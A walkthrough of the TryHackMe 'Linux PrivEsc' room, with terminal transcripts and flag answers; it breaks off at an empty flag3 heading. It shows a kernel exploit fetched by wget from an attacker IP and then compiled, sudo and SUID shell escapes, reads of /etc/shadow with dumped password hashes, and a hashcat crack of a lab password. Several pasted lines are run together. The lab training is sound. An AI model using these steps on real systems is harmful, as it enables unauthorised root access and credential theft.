# TryHackMe [Linux PrivEsc](https://tryhackme.com/room/linprivesc)
## Enumeration
### What is the hostname of the target system?
```bash
$ ssh karen@10.10.207.133
karen@10.10.207.133 password: Password1
$ hostname
wade7363
```

**Answer**: `wade7363`
### What is the Linux kernel version of the target system?
```bash
$ uname -a
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

**Answer**: `3.13.0-24-generic`
### What Linux is this?
```bash
$ cat /etc/issue
Ubuntu 14.04 LTS
```
**Answer**: `Ubuntu 14.04 LTS`
### What version of the Python language is installed on the system?
```bash
$ python --version
Python 2.7.6
```

**Answer**: `2.7.6`
### What vulnerability seem to affect the kernel of the target system?
* https://www.exploit-db.com/exploits/37292

**Answer**: `CVE-2015-1328`
## Kernel Exploits
### What is the content of the `flag1.txt` file?
```bash
$ ssh karen@10.10.239.187
karen@10.10.239.187 password: Password1
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
karen@wade7363:/home/matt$ cd /tmp
karen@wade7363:/tmp$ wget http://10.4.32.172/ofs.c -O ofs.ckaren@wade7363:/tmp$ gcc -o ofs ofs.c
karen@wade7363:/tmp$ ./ofs
# cat /python3 -c 'import pty; pty.spawn("/bin/bash")'
root@wade7363:/tmp# cat /home/matt/flag1.txt 
THM-28392872729920
```

**Flag 1**: `THM-28392872729920`
## `sudo`
### How many programs can the user `karen` run on the target system with `sudo` rights?
```bash
$ ssh karen@10.10.239.187
karen@10.10.239.187 password: Password1
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
karen@ip-10-10-123-126:/$ sudo -l
Matching Defaults entries for karen on ip-10-10-123-126:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karen may run the following commands on ip-10-10-123-126:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
```
**Answer**: `3`
### What is the content of the `flag2.txt` file?
* According to [GTFOBins](https://gtfobins.github.io/gtfobins/find/#sudo)

```bash
karen@ip-10-10-123-126:/$ sudo find . -exec /bin/sh \; -quit
# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@ip-10-10-123-126:/# cat /home/ubuntu/flag2.txt 
THM-402028394
```

**Flag 2**: `THM-402028394`
### How would you use `nmap` to spawn a `root` shell if your user had `sudo` rights on `nmap`?
* According to [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/#sudo)

**Answer**: `sudo nmap --interactive`
### What is the hash of `frank`'s password?
```bash
root@ip-10-10-123-126:/# cat /etc/shadow
root:*:18561:0:99999:7:::
daemon:*:18561:0:99999:7:::
bin:*:18561:0:99999:7:::
sys:*:18561:0:99999:7:::
sync:*:18561:0:99999:7:::
games:*:18561:0:99999:7:::
man:*:18561:0:99999:7:::
lp:*:18561:0:99999:7:::
mail:*:18561:0:99999:7:::
news:*:18561:0:99999:7:::
uucp:*:18561:0:99999:7:::
proxy:*:18561:0:99999:7:::
www-data:*:18561:0:99999:7:::
backup:*:18561:0:99999:7:::
list:*:18561:0:99999:7:::
irc:*:18561:0:99999:7:::
gnats:*:18561:0:99999:7:::
nobody:*:18561:0:99999:7:::
systemd-network:*:18561:0:99999:7:::
systemd-resolve:*:18561:0:99999:7:::
systemd-timesync:*:18561:0:99999:7:::
messagebus:*:18561:0:99999:7:::
syslog:*:18561:0:99999:7:::
_apt:*:18561:0:99999:7:::
tss:*:18561:0:99999:7:::
uuidd:*:18561:0:99999:7:::
tcpdump:*:18561:0:99999:7:::
sshd:*:18561:0:99999:7:::
landscape:*:18561:0:99999:7:::
pollinate:*:18561:0:99999:7:::
ec2-instance-connect:!:18561:0:99999:7:::
systemd-coredump:!!:18796::::::
ubuntu:!:18796:0:99999:7:::
lxd:!:18796::::::
karen:$6$QHTxjZ77ZcxU54ov$DCV2wd1mG5wJoTB.cXJoXtLVDZe1Ec1jbQFv3ICAYbnMqdhJzIEi3H4qyyKO7T75h4hHQWuWWzBH7brjZiSaX0:18796:0:99999:7:::
frank:$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1:18796:0:99999:7:::
```

**Answer**: `$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1`
## SUID
### Which user shares the name of a great comic book writer?
```bash
$ ssh karen@10.10.239.187
karen@10.10.239.187 password: Password1
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
karen@ip-10-10-182-233:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
gerryconway:x:1001:1001::/home/gerryconway:/bin/sh
user2:x:1002:1002::/home/user2:/bin/sh
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
karen:x:1003:1003::/home/karen:/bin/sh
```

**Answer**: `gerryconway`
### What is the password of `user2`?
1. Enumerate for SUID binaries:
```bash
karen@ip-10-10-182-233:/$ find / -type f -perm -04000 -ls 2>/dev/null
       66     40 -rwsr-xr-x   1 root     root        40152 Jan 27  2020 /snap/core/10185/bin/mount
       80     44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /snap/core/10185/bin/ping
       81     44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /snap/core/10185/bin/ping6
       98     40 -rwsr-xr-x   1 root     root        40128 Mar 25  2019 /snap/core/10185/bin/su
      116     27 -rwsr-xr-x   1 root     root        27608 Jan 27  2020 /snap/core/10185/bin/umount
     2610     71 -rwsr-xr-x   1 root     root        71824 Mar 25  2019 /snap/core/10185/usr/bin/chfn
     2612     40 -rwsr-xr-x   1 root     root        40432 Mar 25  2019 /snap/core/10185/usr/bin/chsh
     2689     74 -rwsr-xr-x   1 root     root        75304 Mar 25  2019 /snap/core/10185/usr/bin/gpasswd
     2781     39 -rwsr-xr-x   1 root     root        39904 Mar 25  2019 /snap/core/10185/usr/bin/newgrp
     2794     53 -rwsr-xr-x   1 root     root        54256 Mar 25  2019 /snap/core/10185/usr/bin/passwd
     2904    134 -rwsr-xr-x   1 root     root       136808 Jan 31  2020 /snap/core/10185/usr/bin/sudo
     3003     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core/10185/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     3375    419 -rwsr-xr-x   1 root     root              428240 May 26  2020 /snap/core/10185/usr/lib/openssh/ssh-keysign
     6437    109 -rwsr-xr-x   1 root     root              110792 Oct  8  2020 /snap/core/10185/usr/lib/snapd/snap-confine
     7615    386 -rwsr-xr--   1 root     dip               394984 Jul 23  2020 /snap/core/10185/usr/sbin/pppd
       56     43 -rwsr-xr-x   1 root     root               43088 Mar  5  2020 /snap/core18/1885/bin/mount
       65     63 -rwsr-xr-x   1 root     root               64424 Jun 28  2019 /snap/core18/1885/bin/ping
       81     44 -rwsr-xr-x   1 root     root               44664 Mar 22  2019 /snap/core18/1885/bin/su
       99     27 -rwsr-xr-x   1 root     root               26696 Mar  5  2020 /snap/core18/1885/bin/umount
     1698     75 -rwsr-xr-x   1 root     root               76496 Mar 22  2019 /snap/core18/1885/usr/bin/chfn
     1700     44 -rwsr-xr-x   1 root     root               44528 Mar 22  2019 /snap/core18/1885/usr/bin/chsh
     1752     75 -rwsr-xr-x   1 root     root               75824 Mar 22  2019 /snap/core18/1885/usr/bin/gpasswd
     1816     40 -rwsr-xr-x   1 root     root               40344 Mar 22  2019 /snap/core18/1885/usr/bin/newgrp
     1828     59 -rwsr-xr-x   1 root     root               59640 Mar 22  2019 /snap/core18/1885/usr/bin/passwd
     1919    146 -rwsr-xr-x   1 root     root              149080 Jan 31  2020 /snap/core18/1885/usr/bin/sudo
     2006     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     2314    427 -rwsr-xr-x   1 root     root              436552 Mar  4  2019 /snap/core18/1885/usr/lib/openssh/ssh-keysign
     7477     52 -rwsr-xr--   1 root     messagebus         51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    13816    464 -rwsr-xr-x   1 root     root              473576 May 29  2020 /usr/lib/openssh/ssh-keysign
    13661     24 -rwsr-xr-x   1 root     root               22840 Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1
     7479     16 -rwsr-xr-x   1 root     root               14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
    13676    128 -rwsr-xr-x   1 root     root              130152 Oct  8  2020 /usr/lib/snapd/snap-confine
     1856     84 -rwsr-xr-x   1 root     root               85064 May 28  2020 /usr/bin/chfn
     2300     32 -rwsr-xr-x   1 root     root               31032 Aug 16  2019 /usr/bin/pkexec
     1816    164 -rwsr-xr-x   1 root     root              166056 Jul 15  2020 /usr/bin/sudo
     1634     40 -rwsr-xr-x   1 root     root               39144 Jul 21  2020 /usr/bin/umount
     1860     68 -rwsr-xr-x   1 root     root               68208 May 28  2020 /usr/bin/passwd
     1859     88 -rwsr-xr-x   1 root     root               88464 May 28  2020 /usr/bin/gpasswd
     1507     44 -rwsr-xr-x   1 root     root               44784 May 28  2020 /usr/bin/newgrp
     1857     52 -rwsr-xr-x   1 root     root               53040 May 28  2020 /usr/bin/chsh
     1722     44 -rwsr-xr-x   1 root     root               43352 Sep  5  2019 /usr/bin/base64
     1674     68 -rwsr-xr-x   1 root     root               67816 Jul 21  2020 /usr/bin/su
     2028     40 -rwsr-xr-x   1 root     root               39144 Mar  7  2020 /usr/bin/fusermount
     2166     56 -rwsr-sr-x   1 daemon   daemon             55560 Nov 12  2018 /usr/bin/at
     1633     56 -rwsr-xr-x   1 root     root               55528 Jul 21  2020 /usr/bin/mount
```
2. Decode and encode the password hashes using [GTFOBins `base64` method](https://gtfobins.github.io/gtfobins/base64/#suid):
```bash
karen@ip-10-10-182-233:/$ base64 /etc/shadow | base64 --decode
root:*:18561:0:99999:7:::
daemon:*:18561:0:99999:7:::
bin:*:18561:0:99999:7:::
sys:*:18561:0:99999:7:::
sync:*:18561:0:99999:7:::
games:*:18561:0:99999:7:::
man:*:18561:0:99999:7:::
lp:*:18561:0:99999:7:::
mail:*:18561:0:99999:7:::
news:*:18561:0:99999:7:::
uucp:*:18561:0:99999:7:::
proxy:*:18561:0:99999:7:::
www-data:*:18561:0:99999:7:::
backup:*:18561:0:99999:7:::
list:*:18561:0:99999:7:::
irc:*:18561:0:99999:7:::
gnats:*:18561:0:99999:7:::
nobody:*:18561:0:99999:7:::
systemd-network:*:18561:0:99999:7:::
systemd-resolve:*:18561:0:99999:7:::
systemd-timesync:*:18561:0:99999:7:::
messagebus:*:18561:0:99999:7:::
syslog:*:18561:0:99999:7:::
_apt:*:18561:0:99999:7:::
tss:*:18561:0:99999:7:::
uuidd:*:18561:0:99999:7:::
tcpdump:*:18561:0:99999:7:::
sshd:*:18561:0:99999:7:::
landscape:*:18561:0:99999:7:::
pollinate:*:18561:0:99999:7:::
ec2-instance-connect:!:18561:0:99999:7:::
systemd-coredump:!!:18796::::::
ubuntu:!:18796:0:99999:7:::
gerryconway:$6$vgzgxM3ybTlB.wkV$48YDY7qQnp4purOJ19mxfMOwKt.H2LaWKPu0zKlWKaUMG1N7weVzqobp65RxlMIZ/NirxeZdOJMEOp3ofE.RT/:18796:0:99999:7:::
user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
lxd:!:18796::::::
karen:$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCbQWJqYLGpy.Zscna9GILCSaNLJdBP1p8/:18796:0:99999:7:::
```
3. Break the hashed password with `hashcat`:
```bash
$ hashcat -O -D 2 -m 1800 '$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/' rockyou.txt
$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:Password1
Session..........: hashcat
Status...........: Cracked
Hash.Name........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: $6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep...VV1mb/
Time.Started.....: Tue Oct 26 19:22:52 2021 (3 secs)
Time.Estimated...: Tue Oct 26 19:22:55 2021 (0 secs)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:     2311 H/s (7.02ms) @ Accel:8 Loops:32 Thr:8 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 6146/14344384 (0.04%)
Rejected.........: 2/6146 (0.03%)
Restore.Point....: 3074/14344384 (0.02%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:4992-5000
Candidates.#2....: theking -> gemini1
```

### What is the content of the `flag3.txt` file?

